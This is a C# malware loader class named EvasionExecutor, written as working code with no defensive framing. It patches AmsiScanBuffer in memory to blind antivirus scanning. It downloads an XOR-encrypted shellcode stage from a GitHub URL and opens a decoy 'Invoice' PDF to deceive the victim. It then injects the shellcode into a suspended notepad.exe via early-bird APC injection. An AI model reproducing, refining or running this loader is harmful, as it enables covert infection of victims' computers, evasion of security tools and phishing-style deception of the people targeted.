using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

public class EvasionExecutor
{
    // --- Win32 Structures needed for CreateProcess ---
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // --- Win32 API Functions for Process Injection ---
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(IntPtr hThread);
    
    // --- Standard Functions (Unchanged) ---
    [DllImport("kernel32.dll")] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] private static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


    // --- Your Shellcode Key (Unchanged) ---
    private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

    public void Trigger()
    {
        // Patch AMSI in our current powershell.exe process first
        PatchMem();

        // Download decoy and payload
        byte[] shellcode = DownloadAndDecryptPayload();
        RunDecoy();

        // Now inject into a new process
        if (shellcode != null)
        {
            InjectAndExecute(shellcode);
        }
    }
    
    private void InjectAndExecute(byte[] shellcode)
    {
        // Use a legitimate 32-bit target from SysWOW64
        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe"; 
        
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // 0x4 = CREATE_SUSPENDED
        bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        if (success)
        {
            // Allocate memory in the remote process
            // 0x3000 = MEM_COMMIT | MEM_RESERVE; 0x40 = PAGE_EXECUTE_READWRITE
            IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            // Write the shellcode to the allocated memory
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

            // Queue the shellcode to run in the main thread of the new process
            QueueUserAPC(remoteAddr, pi.hThread, IntPtr.Zero);
            
            // Resume the process to trigger the APC
            ResumeThread(pi.hThread);
        }
    }
    
    // --- Helper functions for clarity ---
    private byte[] DownloadAndDecryptPayload()
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
                byte[] encryptedShellcode = client.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
                
                byte[] shellcode = new byte[encryptedShellcode.Length];
                for (int i = 0; i < encryptedShellcode.Length; i++)
                {
                    shellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
                }
                return shellcode;
            }
        }
        catch { return null; }
    }
    
    private void RunDecoy()
    {
        try
        {
            using (WebClient pdfClient = new WebClient())
            {
                string tempPdfPath = Path.GetTempPath() + "Invoice-" + Path.GetRandomFileName().Substring(0, 8) + ".pdf";
                pdfClient.DownloadFile("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf", tempPdfPath);
                Process.Start(tempPdfPath);
            }
        }
        catch { }
    }

    private void PatchMem()
    {
        try
        {
            string lib = "am" + "si" + ".dll";
            string func = "Amsi" + "Scan" + "Buffer";
            IntPtr libHandle = LoadLibrary(lib);
            IntPtr funcAddress = GetProcAddress(libHandle, func);
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint oldProtect;
            VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, funcAddress, patch.Length);
            VirtualProtect(funcAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        }
        catch { }
    }
}
